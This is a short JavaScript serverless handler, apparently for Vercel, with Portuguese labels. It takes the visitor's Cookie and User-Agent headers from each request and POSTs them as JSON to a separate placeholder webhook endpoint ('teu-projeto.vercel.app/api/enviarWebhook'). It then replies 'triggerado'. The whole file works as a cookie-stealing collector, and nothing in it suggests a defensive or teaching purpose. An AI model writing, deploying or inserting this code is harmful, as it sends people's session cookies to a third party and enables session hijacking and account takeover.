export default async function handler(req, res) {
  const cookie = req.headers.cookie || "sem cookie"
  const ua = req.headers['user-agent'] || "sem UA"

  await fetch("https://teu-projeto.vercel.app/api/enviarWebhook", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cookie, ua })
  })

  res.status(200).json({ status: "triggerado" })
}
